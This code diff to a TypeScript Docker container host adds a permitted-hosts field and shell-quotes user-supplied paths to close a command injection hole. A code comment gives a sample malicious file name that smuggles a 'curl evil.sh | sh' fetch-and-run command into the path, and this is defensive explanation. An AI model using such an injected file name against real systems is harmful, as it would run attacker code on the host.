@@ -1,5 +1,6 @@
 import { FactoryError } from '@factory/shared';
 import { TIMEOUT_EXIT_CODE } from '../engines/limits';
+import { quoteOne } from './shell';
 
 /**
  * The container host, behind one interface. The Runner is the only component
@@ -9,12 +10,24 @@ import { TIMEOUT_EXIT_CODE } from '../engines/limits';
 
 export interface ContainerSpec {
   image: string;
-  /** Ceilings from the workspace settings (FR-085). */
+  /**
+   * Ceilings from the workspace settings (FR-085). Upper bounds on what a run
+   * may consume, never minimums: an execution host that offers fixed
+   * allocations gives the largest that fits WITHIN these, and refuses to
+   * create a sandbox at all when none does (002 FR-005, FR-009).
+   */
   cpu: number;
   memoryMb: number;
+  /** Not quantised: enforced exactly, by the host itself (002 FR-009a, FR-010). */
   wallClockMinutes: number;
   /** Network reach while code is being written (FR-085). */
   network: boolean;
+  /**
+   * What a restricted step may reach beyond the model service, the design
+   * service and the run's git provider — resolved from the snapshot, so
+   * editing a workspace changes no run in flight (002 FR-012c).
+   */
+  permittedHosts: string[];
   /** Credentials arrive as environment, never as files (FR-083). */
   env: Record<string, string>;
   workdir: string;
@@ -87,9 +100,14 @@ export const dockerHost: ContainerHost = {
   },
 
   async writeFile(containerId, path, content) {
-    const result = await run('docker', ['exec', '-i', containerId, 'sh', '-c', `cat > '${path}'`], {
-      stdin: content,
-    });
+    // `path` is data — a step's required documents are typed into the pipeline
+    // builder, so an unquoted interpolation here would let a document named
+    // `a'; curl evil.sh | sh; '.md` run whatever it liked (FR-015).
+    const result = await run(
+      'docker',
+      ['exec', '-i', containerId, 'sh', '-c', `cat > ${quoteOne(path)}`],
+      { stdin: content },
+    );
     if (result.exitCode !== 0) {
       throw new FactoryError('sandbox_lost', `could not write ${path}`, {
         detail: result.stderr.trim(),
@@ -108,7 +126,8 @@ export const dockerHost: ContainerHost = {
       containerId,
       'sh',
       '-c',
-      `test -f '${path}' && wc -c < '${path}'`,
+      // Same reason as writeFile: this path came from a person (FR-015).
+      `test -f ${quoteOne(path)} && wc -c < ${quoteOne(path)}`,
     ]);
     if (result.exitCode !== 0) return null;
     const size = Number(result.stdout.trim());
